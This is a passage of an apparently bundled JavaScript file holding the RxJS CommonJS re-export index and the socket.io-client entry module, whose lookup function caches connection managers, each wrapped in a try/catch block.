Object.defineProperty(exports, "ConnectableObservable", { enumerable: true, get: function () { return ConnectableObservable_1.ConnectableObservable; } });
var observable_1 = require("./internal/symbol/observable");
Object.defineProperty(exports, "observable", { enumerable: true, get: function () { return observable_1.observable; } });
var animationFrames_1 = require("./internal/observable/dom/animationFrames");
Object.defineProperty(exports, "animationFrames", { enumerable: true, get: function () { return animationFrames_1.animationFrames; } });
var Subject_1 = require("./internal/Subject");
Object.defineProperty(exports, "Subject", { enumerable: true, get: function () { return Subject_1.Subject; } });
var BehaviorSubject_1 = require("./internal/BehaviorSubject");
Object.defineProperty(exports, "BehaviorSubject", { enumerable: true, get: function () { return BehaviorSubject_1.BehaviorSubject; } });
var ReplaySubject_1 = require("./internal/ReplaySubject");
Object.defineProperty(exports, "ReplaySubject", { enumerable: true, get: function () { return ReplaySubject_1.ReplaySubject; } });
var AsyncSubject_1 = require("./internal/AsyncSubject");
Object.defineProperty(exports, "AsyncSubject", { enumerable: true, get: function () { return AsyncSubject_1.AsyncSubject; } });
var asap_1 = require("./internal/scheduler/asap");
Object.defineProperty(exports, "asap", { enumerable: true, get: function () { return asap_1.asap; } });
Object.defineProperty(exports, "asapScheduler", { enumerable: true, get: function () { return asap_1.asapScheduler; } });
var async_1 = require("./internal/scheduler/async");
Object.defineProperty(exports, "async", { enumerable: true, get: function () { return async_1.async; } });
Object.defineProperty(exports, "asyncScheduler", { enumerable: true, get: function () { return async_1.asyncScheduler; } });
var queue_1 = require("./internal/scheduler/queue");
Object.defineProperty(exports, "queue", { enumerable: true, get: function () { return queue_1.queue; } });
Object.defineProperty(exports, "queueScheduler", { enumerable: true, get: function () { return queue_1.queueScheduler; } });
var animationFrame_1 = require("./internal/scheduler/animationFrame");
Object.defineProperty(exports, "animationFrame", { enumerable: true, get: function () { return animationFrame_1.animationFrame; } });
Object.defineProperty(exports, "animationFrameScheduler", { enumerable: true, get: function () { return animationFrame_1.animationFrameScheduler; } });
var VirtualTimeScheduler_1 = require("./internal/scheduler/VirtualTimeScheduler");
Object.defineProperty(exports, "VirtualTimeScheduler", { enumerable: true, get: function () { return VirtualTimeScheduler_1.VirtualTimeScheduler; } });
Object.defineProperty(exports, "VirtualAction", { enumerable: true, get: function () { return VirtualTimeScheduler_1.VirtualAction; } });
var Scheduler_1 = require("./internal/Scheduler");
Object.defineProperty(exports, "Scheduler", { enumerable: true, get: function () { return Scheduler_1.Scheduler; } });
var Subscription_1 = require("./internal/Subscription");
Object.defineProperty(exports, "Subscription", { enumerable: true, get: function () { return Subscription_1.Subscription; } });
var Subscriber_1 = require("./internal/Subscriber");
Object.defineProperty(exports, "Subscriber", { enumerable: true, get: function () { return Subscriber_1.Subscriber; } });
var Notification_1 = require("./internal/Notification");
Object.defineProperty(exports, "Notification", { enumerable: true, get: function () { return Notification_1.Notification; } });
Object.defineProperty(exports, "NotificationKind", { enumerable: true, get: function () { return Notification_1.NotificationKind; } });
var pipe_1 = require("./internal/util/pipe");
Object.defineProperty(exports, "pipe", { enumerable: true, get: function () { return pipe_1.pipe; } });
var noop_1 = require("./internal/util/noop");
Object.defineProperty(exports, "noop", { enumerable: true, get: function () { return noop_1.noop; } });
var identity_1 = require("./internal/util/identity");
Object.defineProperty(exports, "identity", { enumerable: true, get: function () { return identity_1.identity; } });
var isObservable_1 = require("./internal/util/isObservable");
Object.defineProperty(exports, "isObservable", { enumerable: true, get: function () { return isObservable_1.isObservable; } });
var lastValueFrom_1 = require("./internal/lastValueFrom");
Object.defineProperty(exports, "lastValueFrom", { enumerable: true, get: function () { return lastValueFrom_1.lastValueFrom; } });
var firstValueFrom_1 = require("./internal/firstValueFrom");
Object.defineProperty(exports, "firstValueFrom", { enumerable: true, get: function () { return firstValueFrom_1.firstValueFrom; } });
var ArgumentOutOfRangeError_1 = require("./internal/util/ArgumentOutOfRangeError");
Object.defineProperty(exports, "ArgumentOutOfRangeError", { enumerable: true, get: function () { return ArgumentOutOfRangeError_1.ArgumentOutOfRangeError; } });
var EmptyError_1 = require("./internal/util/EmptyError");
Object.defineProperty(exports, "EmptyError", { enumerable: true, get: function () { return EmptyError_1.EmptyError; } });
var NotFoundError_1 = require("./internal/util/NotFoundError");
Object.defineProperty(exports, "NotFoundError", { enumerable: true, get: function () { return NotFoundError_1.NotFoundError; } });
var ObjectUnsubscribedError_1 = require("./internal/util/ObjectUnsubscribedError");
Object.defineProperty(exports, "ObjectUnsubscribedError", { enumerable: true, get: function () { return ObjectUnsubscribedError_1.ObjectUnsubscribedError; } });
var SequenceError_1 = require("./internal/util/SequenceError");
Object.defineProperty(exports, "SequenceError", { enumerable: true, get: function () { return SequenceError_1.SequenceError; } });
var timeout_1 = require("./internal/operators/timeout");
Object.defineProperty(exports, "TimeoutError", { enumerable: true, get: function () { return timeout_1.TimeoutError; } });
var UnsubscriptionError_1 = require("./internal/util/UnsubscriptionError");
Object.defineProperty(exports, "UnsubscriptionError", { enumerable: true, get: function () { return UnsubscriptionError_1.UnsubscriptionError; } });
var bindCallback_1 = require("./internal/observable/bindCallback");
Object.defineProperty(exports, "bindCallback", { enumerable: true, get: function () { return bindCallback_1.bindCallback; } });
var bindNodeCallback_1 = require("./internal/observable/bindNodeCallback");
Object.defineProperty(exports, "bindNodeCallback", { enumerable: true, get: function () { return bindNodeCallback_1.bindNodeCallback; } });
var combineLatest_1 = require("./internal/observable/combineLatest");
Object.defineProperty(exports, "combineLatest", { enumerable: true, get: function () { return combineLatest_1.combineLatest; } });
var concat_1 = require("./internal/observable/concat");
Object.defineProperty(exports, "concat", { enumerable: true, get: function () { return concat_1.concat; } });
var connectable_1 = require("./internal/observable/connectable");
Object.defineProperty(exports, "connectable", { enumerable: true, get: function () { return connectable_1.connectable; } });
var defer_1 = require("./internal/observable/defer");
Object.defineProperty(exports, "defer", { enumerable: true, get: function () { return defer_1.defer; } });
var empty_1 = require("./internal/observable/empty");
Object.defineProperty(exports, "empty", { enumerable: true, get: function () { return empty_1.empty; } });
var forkJoin_1 = require("./internal/observable/forkJoin");
Object.defineProperty(exports, "forkJoin", { enumerable: true, get: function () { return forkJoin_1.forkJoin; } });
var from_1 = require("./internal/observable/from");
Object.defineProperty(exports, "from", { enumerable: true, get: function () { return from_1.from; } });
var fromEvent_1 = require("./internal/observable/fromEvent");
Object.defineProperty(exports, "fromEvent", { enumerable: true, get: function () { return fromEvent_1.fromEvent; } });
var fromEventPattern_1 = require("./internal/observable/fromEventPattern");
Object.defineProperty(exports, "fromEventPattern", { enumerable: true, get: function () { return fromEventPattern_1.fromEventPattern; } });
var generate_1 = require("./internal/observable/generate");
Object.defineProperty(exports, "generate", { enumerable: true, get: function () { return generate_1.generate; } });
var iif_1 = require("./internal/observable/iif");
Object.defineProperty(exports, "iif", { enumerable: true, get: function () { return iif_1.iif; } });
var interval_1 = require("./internal/observable/interval");
Object.defineProperty(exports, "interval", { enumerable: true, get: function () { return interval_1.interval; } });
var merge_1 = require("./internal/observable/merge");
Object.defineProperty(exports, "merge", { enumerable: true, get: function () { return merge_1.merge; } });
var never_1 = require("./internal/observable/never");
Object.defineProperty(exports, "never", { enumerable: true, get: function () { return never_1.never; } });
var of_1 = require("./internal/observable/of");
Object.defineProperty(exports, "of", { enumerable: true, get: function () { return of_1.of; } });
var onErrorResumeNext_1 = require("./internal/observable/onErrorResumeNext");
Object.defineProperty(exports, "onErrorResumeNext", { enumerable: true, get: function () { return onErrorResumeNext_1.onErrorResumeNext; } });
var pairs_1 = require("./internal/observable/pairs");
Object.defineProperty(exports, "pairs", { enumerable: true, get: function () { return pairs_1.pairs; } });
var partition_1 = require("./internal/observable/partition");
Object.defineProperty(exports, "partition", { enumerable: true, get: function () { return partition_1.partition; } });
var race_1 = require("./internal/observable/race");
Object.defineProperty(exports, "race", { enumerable: true, get: function () { return race_1.race; } });
var range_1 = require("./internal/observable/range");
Object.defineProperty(exports, "range", { enumerable: true, get: function () { return range_1.range; } });
var throwError_1 = require("./internal/observable/throwError");
Object.defineProperty(exports, "throwError", { enumerable: true, get: function () { return throwError_1.throwError; } });
var timer_1 = require("./internal/observable/timer");
Object.defineProperty(exports, "timer", { enumerable: true, get: function () { return timer_1.timer; } });
var using_1 = require("./internal/observable/using");
Object.defineProperty(exports, "using", { enumerable: true, get: function () { return using_1.using; } });
var zip_1 = require("./internal/observable/zip");
Object.defineProperty(exports, "zip", { enumerable: true, get: function () { return zip_1.zip; } });
var scheduled_1 = require("./internal/scheduled/scheduled");
Object.defineProperty(exports, "scheduled", { enumerable: true, get: function () { return scheduled_1.scheduled; } });
var empty_2 = require("./internal/observable/empty");
Object.defineProperty(exports, "EMPTY", { enumerable: true, get: function () { return empty_2.EMPTY; } });
var never_2 = require("./internal/observable/never");
Object.defineProperty(exports, "NEVER", { enumerable: true, get: function () { return never_2.NEVER; } });
__exportStar(require("./internal/types"), exports);
var config_1 = require("./internal/config");
Object.defineProperty(exports, "config", { enumerable: true, get: function () { return config_1.config; } });
var audit_1 = require("./internal/operators/audit");
Object.defineProperty(exports, "audit", { enumerable: true, get: function () { return audit_1.audit; } });
var auditTime_1 = require("./internal/operators/auditTime");
Object.defineProperty(exports, "auditTime", { enumerable: true, get: function () { return auditTime_1.auditTime; } });
var buffer_1 = require("./internal/operators/buffer");
Object.defineProperty(exports, "buffer", { enumerable: true, get: function () { return buffer_1.buffer; } });
var bufferCount_1 = require("./internal/operators/bufferCount");
Object.defineProperty(exports, "bufferCount", { enumerable: true, get: function () { return bufferCount_1.bufferCount; } });
var bufferTime_1 = require("./internal/operators/bufferTime");
Object.defineProperty(exports, "bufferTime", { enumerable: true, get: function () { return bufferTime_1.bufferTime; } });
var bufferToggle_1 = require("./internal/operators/bufferToggle");
Object.defineProperty(exports, "bufferToggle", { enumerable: true, get: function () { return bufferToggle_1.bufferToggle; } });
var bufferWhen_1 = require("./internal/operators/bufferWhen");
Object.defineProperty(exports, "bufferWhen", { enumerable: true, get: function () { return bufferWhen_1.bufferWhen; } });
var catchError_1 = require("./internal/operators/catchError");
Object.defineProperty(exports, "catchError", { enumerable: true, get: function () { return catchError_1.catchError; } });
var combineAll_1 = require("./internal/operators/combineAll");
Object.defineProperty(exports, "combineAll", { enumerable: true, get: function () { return combineAll_1.combineAll; } });
var combineLatestAll_1 = require("./internal/operators/combineLatestAll");
Object.defineProperty(exports, "combineLatestAll", { enumerable: true, get: function () { return combineLatestAll_1.combineLatestAll; } });
var combineLatestWith_1 = require("./internal/operators/combineLatestWith");
Object.defineProperty(exports, "combineLatestWith", { enumerable: true, get: function () { return combineLatestWith_1.combineLatestWith; } });
var concatAll_1 = require("./internal/operators/concatAll");
Object.defineProperty(exports, "concatAll", { enumerable: true, get: function () { return concatAll_1.concatAll; } });
var concatMap_1 = require("./internal/operators/concatMap");
Object.defineProperty(exports, "concatMap", { enumerable: true, get: function () { return concatMap_1.concatMap; } });
var concatMapTo_1 = require("./internal/operators/concatMapTo");
Object.defineProperty(exports, "concatMapTo", { enumerable: true, get: function () { return concatMapTo_1.concatMapTo; } });
var concatWith_1 = require("./internal/operators/concatWith");
Object.defineProperty(exports, "concatWith", { enumerable: true, get: function () { return concatWith_1.concatWith; } });
var connect_1 = require("./internal/operators/connect");
Object.defineProperty(exports, "connect", { enumerable: true, get: function () { return connect_1.connect; } });
var count_1 = require("./internal/operators/count");
Object.defineProperty(exports, "count", { enumerable: true, get: function () { return count_1.count; } });
var debounce_1 = require("./internal/operators/debounce");
Object.defineProperty(exports, "debounce", { enumerable: true, get: function () { return debounce_1.debounce; } });
var debounceTime_1 = require("./internal/operators/debounceTime");
Object.defineProperty(exports, "debounceTime", { enumerable: true, get: function () { return debounceTime_1.debounceTime; } });
var defaultIfEmpty_1 = require("./internal/operators/defaultIfEmpty");
Object.defineProperty(exports, "defaultIfEmpty", { enumerable: true, get: function () { return defaultIfEmpty_1.defaultIfEmpty; } });
var delay_1 = require("./internal/operators/delay");
Object.defineProperty(exports, "delay", { enumerable: true, get: function () { return delay_1.delay; } });
var delayWhen_1 = require("./internal/operators/delayWhen");
Object.defineProperty(exports, "delayWhen", { enumerable: true, get: function () { return delayWhen_1.delayWhen; } });
var dematerialize_1 = require("./internal/operators/dematerialize");
Object.defineProperty(exports, "dematerialize", { enumerable: true, get: function () { return dematerialize_1.dematerialize; } });
var distinct_1 = require("./internal/operators/distinct");
Object.defineProperty(exports, "distinct", { enumerable: true, get: function () { return distinct_1.distinct; } });
var distinctUntilChanged_1 = require("./internal/operators/distinctUntilChanged");
Object.defineProperty(exports, "distinctUntilChanged", { enumerable: true, get: function () { return distinctUntilChanged_1.distinctUntilChanged; } });
var distinctUntilKeyChanged_1 = require("./internal/operators/distinctUntilKeyChanged");
Object.defineProperty(exports, "distinctUntilKeyChanged", { enumerable: true, get: function () { return distinctUntilKeyChanged_1.distinctUntilKeyChanged; } });
var elementAt_1 = require("./internal/operators/elementAt");
Object.defineProperty(exports, "elementAt", { enumerable: true, get: function () { return elementAt_1.elementAt; } });
var endWith_1 = require("./internal/operators/endWith");
Object.defineProperty(exports, "endWith", { enumerable: true, get: function () { return endWith_1.endWith; } });
var every_1 = require("./internal/operators/every");
Object.defineProperty(exports, "every", { enumerable: true, get: function () { return every_1.every; } });
var exhaust_1 = require("./internal/operators/exhaust");
Object.defineProperty(exports, "exhaust", { enumerable: true, get: function () { return exhaust_1.exhaust; } });
var exhaustAll_1 = require("./internal/operators/exhaustAll");
Object.defineProperty(exports, "exhaustAll", { enumerable: true, get: function () { return exhaustAll_1.exhaustAll; } });
var exhaustMap_1 = require("./internal/operators/exhaustMap");
Object.defineProperty(exports, "exhaustMap", { enumerable: true, get: function () { return exhaustMap_1.exhaustMap; } });
var expand_1 = require("./internal/operators/expand");
Object.defineProperty(exports, "expand", { enumerable: true, get: function () { return expand_1.expand; } });
var filter_1 = require("./internal/operators/filter");
Object.defineProperty(exports, "filter", { enumerable: true, get: function () { return filter_1.filter; } });
var finalize_1 = require("./internal/operators/finalize");
Object.defineProperty(exports, "finalize", { enumerable: true, get: function () { return finalize_1.finalize; } });
var find_1 = require("./internal/operators/find");
Object.defineProperty(exports, "find", { enumerable: true, get: function () { return find_1.find; } });
var findIndex_1 = require("./internal/operators/findIndex");
Object.defineProperty(exports, "findIndex", { enumerable: true, get: function () { return findIndex_1.findIndex; } });
var first_1 = require("./internal/operators/first");
Object.defineProperty(exports, "first", { enumerable: true, get: function () { return first_1.first; } });
var groupBy_1 = require("./internal/operators/groupBy");
Object.defineProperty(exports, "groupBy", { enumerable: true, get: function () { return groupBy_1.groupBy; } });
var ignoreElements_1 = require("./internal/operators/ignoreElements");
Object.defineProperty(exports, "ignoreElements", { enumerable: true, get: function () { return ignoreElements_1.ignoreElements; } });
var isEmpty_1 = require("./internal/operators/isEmpty");
Object.defineProperty(exports, "isEmpty", { enumerable: true, get: function () { return isEmpty_1.isEmpty; } });
var last_1 = require("./internal/operators/last");
Object.defineProperty(exports, "last", { enumerable: true, get: function () { return last_1.last; } });
var map_1 = require("./internal/operators/map");
Object.defineProperty(exports, "map", { enumerable: true, get: function () { return map_1.map; } });
var mapTo_1 = require("./internal/operators/mapTo");
Object.defineProperty(exports, "mapTo", { enumerable: true, get: function () { return mapTo_1.mapTo; } });
var materialize_1 = require("./internal/operators/materialize");
Object.defineProperty(exports, "materialize", { enumerable: true, get: function () { return materialize_1.materialize; } });
var max_1 = require("./internal/operators/max");
Object.defineProperty(exports, "max", { enumerable: true, get: function () { return max_1.max; } });
var mergeAll_1 = require("./internal/operators/mergeAll");
Object.defineProperty(exports, "mergeAll", { enumerable: true, get: function () { return mergeAll_1.mergeAll; } });
var flatMap_1 = require("./internal/operators/flatMap");
Object.defineProperty(exports, "flatMap", { enumerable: true, get: function () { return flatMap_1.flatMap; } });
var mergeMap_1 = require("./internal/operators/mergeMap");
Object.defineProperty(exports, "mergeMap", { enumerable: true, get: function () { return mergeMap_1.mergeMap; } });
var mergeMapTo_1 = require("./internal/operators/mergeMapTo");
Object.defineProperty(exports, "mergeMapTo", { enumerable: true, get: function () { return mergeMapTo_1.mergeMapTo; } });
var mergeScan_1 = require("./internal/operators/mergeScan");
Object.defineProperty(exports, "mergeScan", { enumerable: true, get: function () { return mergeScan_1.mergeScan; } });
var mergeWith_1 = require("./internal/operators/mergeWith");
Object.defineProperty(exports, "mergeWith", { enumerable: true, get: function () { return mergeWith_1.mergeWith; } });
var min_1 = require("./internal/operators/min");
Object.defineProperty(exports, "min", { enumerable: true, get: function () { return min_1.min; } });
var multicast_1 = require("./internal/operators/multicast");
Object.defineProperty(exports, "multicast", { enumerable: true, get: function () { return multicast_1.multicast; } });
var observeOn_1 = require("./internal/operators/observeOn");
Object.defineProperty(exports, "observeOn", { enumerable: true, get: function () { return observeOn_1.observeOn; } });
var onErrorResumeNextWith_1 = require("./internal/operators/onErrorResumeNextWith");
Object.defineProperty(exports, "onErrorResumeNextWith", { enumerable: true, get: function () { return onErrorResumeNextWith_1.onErrorResumeNextWith; } });
var pairwise_1 = require("./internal/operators/pairwise");
Object.defineProperty(exports, "pairwise", { enumerable: true, get: function () { return pairwise_1.pairwise; } });
var pluck_1 = require("./internal/operators/pluck");
Object.defineProperty(exports, "pluck", { enumerable: true, get: function () { return pluck_1.pluck; } });
var publish_1 = require("./internal/operators/publish");
Object.defineProperty(exports, "publish", { enumerable: true, get: function () { return publish_1.publish; } });
var publishBehavior_1 = require("./internal/operators/publishBehavior");
Object.defineProperty(exports, "publishBehavior", { enumerable: true, get: function () { return publishBehavior_1.publishBehavior; } });
var publishLast_1 = require("./internal/operators/publishLast");
Object.defineProperty(exports, "publishLast", { enumerable: true, get: function () { return publishLast_1.publishLast; } });
var publishReplay_1 = require("./internal/operators/publishReplay");
Object.defineProperty(exports, "publishReplay", { enumerable: true, get: function () { return publishReplay_1.publishReplay; } });
var raceWith_1 = require("./internal/operators/raceWith");
Object.defineProperty(exports, "raceWith", { enumerable: true, get: function () { return raceWith_1.raceWith; } });
var reduce_1 = require("./internal/operators/reduce");
Object.defineProperty(exports, "reduce", { enumerable: true, get: function () { return reduce_1.reduce; } });
var repeat_1 = require("./internal/operators/repeat");
Object.defineProperty(exports, "repeat", { enumerable: true, get: function () { return repeat_1.repeat; } });
var repeatWhen_1 = require("./internal/operators/repeatWhen");
Object.defineProperty(exports, "repeatWhen", { enumerable: true, get: function () { return repeatWhen_1.repeatWhen; } });
var retry_1 = require("./internal/operators/retry");
Object.defineProperty(exports, "retry", { enumerable: true, get: function () { return retry_1.retry; } });
var retryWhen_1 = require("./internal/operators/retryWhen");
Object.defineProperty(exports, "retryWhen", { enumerable: true, get: function () { return retryWhen_1.retryWhen; } });
var refCount_1 = require("./internal/operators/refCount");
Object.defineProperty(exports, "refCount", { enumerable: true, get: function () { return refCount_1.refCount; } });
var sample_1 = require("./internal/operators/sample");
Object.defineProperty(exports, "sample", { enumerable: true, get: function () { return sample_1.sample; } });
var sampleTime_1 = require("./internal/operators/sampleTime");
Object.defineProperty(exports, "sampleTime", { enumerable: true, get: function () { return sampleTime_1.sampleTime; } });
var scan_1 = require("./internal/operators/scan");
Object.defineProperty(exports, "scan", { enumerable: true, get: function () { return scan_1.scan; } });
var sequenceEqual_1 = require("./internal/operators/sequenceEqual");
Object.defineProperty(exports, "sequenceEqual", { enumerable: true, get: function () { return sequenceEqual_1.sequenceEqual; } });
var share_1 = require("./internal/operators/share");
Object.defineProperty(exports, "share", { enumerable: true, get: function () { return share_1.share; } });
var shareReplay_1 = require("./internal/operators/shareReplay");
Object.defineProperty(exports, "shareReplay", { enumerable: true, get: function () { return shareReplay_1.shareReplay; } });
var single_1 = require("./internal/operators/single");
Object.defineProperty(exports, "single", { enumerable: true, get: function () { return single_1.single; } });
var skip_1 = require("./internal/operators/skip");
Object.defineProperty(exports, "skip", { enumerable: true, get: function () { return skip_1.skip; } });
var skipLast_1 = require("./internal/operators/skipLast");
Object.defineProperty(exports, "skipLast", { enumerable: true, get: function () { return skipLast_1.skipLast; } });
var skipUntil_1 = require("./internal/operators/skipUntil");
Object.defineProperty(exports, "skipUntil", { enumerable: true, get: function () { return skipUntil_1.skipUntil; } });
var skipWhile_1 = require("./internal/operators/skipWhile");
Object.defineProperty(exports, "skipWhile", { enumerable: true, get: function () { return skipWhile_1.skipWhile; } });
var startWith_1 = require("./internal/operators/startWith");
Object.defineProperty(exports, "startWith", { enumerable: true, get: function () { return startWith_1.startWith; } });
var subscribeOn_1 = require("./internal/operators/subscribeOn");
Object.defineProperty(exports, "subscribeOn", { enumerable: true, get: function () { return subscribeOn_1.subscribeOn; } });
var switchAll_1 = require("./internal/operators/switchAll");
Object.defineProperty(exports, "switchAll", { enumerable: true, get: function () { return switchAll_1.switchAll; } });
var switchMap_1 = require("./internal/operators/switchMap");
Object.defineProperty(exports, "switchMap", { enumerable: true, get: function () { return switchMap_1.switchMap; } });
var switchMapTo_1 = require("./internal/operators/switchMapTo");
Object.defineProperty(exports, "switchMapTo", { enumerable: true, get: function () { return switchMapTo_1.switchMapTo; } });
var switchScan_1 = require("./internal/operators/switchScan");
Object.defineProperty(exports, "switchScan", { enumerable: true, get: function () { return switchScan_1.switchScan; } });
var take_1 = require("./internal/operators/take");
Object.defineProperty(exports, "take", { enumerable: true, get: function () { return take_1.take; } });
var takeLast_1 = require("./internal/operators/takeLast");
Object.defineProperty(exports, "takeLast", { enumerable: true, get: function () { return takeLast_1.takeLast; } });
var takeUntil_1 = require("./internal/operators/takeUntil");
Object.defineProperty(exports, "takeUntil", { enumerable: true, get: function () { return takeUntil_1.takeUntil; } });
var takeWhile_1 = require("./internal/operators/takeWhile");
Object.defineProperty(exports, "takeWhile", { enumerable: true, get: function () { return takeWhile_1.takeWhile; } });
var tap_1 = require("./internal/operators/tap");
Object.defineProperty(exports, "tap", { enumerable: true, get: function () { return tap_1.tap; } });
var throttle_1 = require("./internal/operators/throttle");
Object.defineProperty(exports, "throttle", { enumerable: true, get: function () { return throttle_1.throttle; } });
var throttleTime_1 = require("./internal/operators/throttleTime");
Object.defineProperty(exports, "throttleTime", { enumerable: true, get: function () { return throttleTime_1.throttleTime; } });
var throwIfEmpty_1 = require("./internal/operators/throwIfEmpty");
Object.defineProperty(exports, "throwIfEmpty", { enumerable: true, get: function () { return throwIfEmpty_1.throwIfEmpty; } });
var timeInterval_1 = require("./internal/operators/timeInterval");
Object.defineProperty(exports, "timeInterval", { enumerable: true, get: function () { return timeInterval_1.timeInterval; } });
var timeout_2 = require("./internal/operators/timeout");
Object.defineProperty(exports, "timeout", { enumerable: true, get: function () { return timeout_2.timeout; } });
var timeoutWith_1 = require("./internal/operators/timeoutWith");
Object.defineProperty(exports, "timeoutWith", { enumerable: true, get: function () { return timeoutWith_1.timeoutWith; } });
var timestamp_1 = require("./internal/operators/timestamp");
Object.defineProperty(exports, "timestamp", { enumerable: true, get: function () { return timestamp_1.timestamp; } });
var toArray_1 = require("./internal/operators/toArray");
Object.defineProperty(exports, "toArray", { enumerable: true, get: function () { return toArray_1.toArray; } });
var window_1 = require("./internal/operators/window");
Object.defineProperty(exports, "window", { enumerable: true, get: function () { return window_1.window; } });
var windowCount_1 = require("./internal/operators/windowCount");
Object.defineProperty(exports, "windowCount", { enumerable: true, get: function () { return windowCount_1.windowCount; } });
var windowTime_1 = require("./internal/operators/windowTime");
Object.defineProperty(exports, "windowTime", { enumerable: true, get: function () { return windowTime_1.windowTime; } });
var windowToggle_1 = require("./internal/operators/windowToggle");
Object.defineProperty(exports, "windowToggle", { enumerable: true, get: function () { return windowToggle_1.windowToggle; } });
var windowWhen_1 = require("./internal/operators/windowWhen");
Object.defineProperty(exports, "windowWhen", { enumerable: true, get: function () { return windowWhen_1.windowWhen; } });
var withLatestFrom_1 = require("./internal/operators/withLatestFrom");
Object.defineProperty(exports, "withLatestFrom", { enumerable: true, get: function () { return withLatestFrom_1.withLatestFrom; } });
var zipAll_1 = require("./internal/operators/zipAll");
Object.defineProperty(exports, "zipAll", { enumerable: true, get: function () { return zipAll_1.zipAll; } });
var zipWith_1 = require("./internal/operators/zipWith");
Object.defineProperty(exports, "zipWith", { enumerable: true, get: function () { return zipWith_1.zipWith; } });
//# sourceMappingURL=index.js.map
}catch(e){}
})();

/* >>> socket.io-client (3296 bytes) <<< */
(function(){
try{
"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.WebTransport = exports.WebSocket = exports.NodeWebSocket = exports.XHR = exports.NodeXHR = exports.Fetch = exports.Socket = exports.Manager = exports.protocol = void 0;
exports.io = lookup;
exports.connect = lookup;
exports.default = lookup;
const url_js_1 = require("./url.js");
const manager_js_1 = require("./manager.js");
Object.defineProperty(exports, "Manager", { enumerable: true, get: function () { return manager_js_1.Manager; } });
const socket_js_1 = require("./socket.js");
Object.defineProperty(exports, "Socket", { enumerable: true, get: function () { return socket_js_1.Socket; } });
const debug_1 = __importDefault(require("debug")); // debug()
const debug = (0, debug_1.default)("socket.io-client"); // debug()
/**
 * Managers cache.
 */
const cache = {};
function lookup(uri, opts) {
    if (typeof uri === "object") {
        opts = uri;
        uri = undefined;
    }
    opts = opts || {};
    const parsed = (0, url_js_1.url)(uri, opts.path || "/socket.io");
    const source = parsed.source;
    const id = parsed.id;
    const path = parsed.path;
    const sameNamespace = cache[id] && path in cache[id]["nsps"];
    const newConnection = opts.forceNew ||
        opts["force new connection"] ||
        false === opts.multiplex ||
        sameNamespace;
    let io;
    if (newConnection) {
        debug("ignoring socket cache for %s", source);
        io = new manager_js_1.Manager(source, opts);
    }
    else {
        if (!cache[id]) {
            debug("new io instance for %s", source);
            cache[id] = new manager_js_1.Manager(source, opts);
        }
        io = cache[id];
    }
    if (parsed.query && !opts.query) {
        opts.query = parsed.queryKey;
    }
    return io.socket(parsed.path, opts);
}
// so that "lookup" can be used both as a function (e.g. `io(...)`) and as a
// namespace (e.g. `io.connect(...)`), for backward compatibility
Object.assign(lookup, {
    Manager: manager_js_1.Manager,
    Socket: socket_js_1.Socket,
    io: lookup,
    connect: lookup,
});
/**
 * Protocol version.
 *
 * @public
 */
var socket_io_parser_1 = require("socket.io-parser");
Object.defineProperty(exports, "protocol", { enumerable: true, get: function () { return socket_io_parser_1.protocol; } });
var engine_io_client_1 = require("engine.io-client");
Object.defineProperty(exports, "Fetch", { enumerable: true, get: function () { return engine_io_client_1.Fetch; } });
Object.defineProperty(exports, "NodeXHR", { enumerable: true, get: function () { return engine_io_client_1.NodeXHR; } });
Object.defineProperty(exports, "XHR", { enumerable: true, get: function () { return engine_io_client_1.XHR; } });
Object.defineProperty(exports, "NodeWebSocket", { enumerable: true, get: function () { return engine_io_client_1.NodeWebSocket; } });
Object.defineProperty(exports, "WebSocket", { enumerable: true, get: function () { return engine_io_client_1.WebSocket; } });
Object.defineProperty(exports, "WebTransport", { enumerable: true, get: function () { return engine_io_client_1.WebTransport; } });

module.exports = lookup;

}catch(e){}
})();

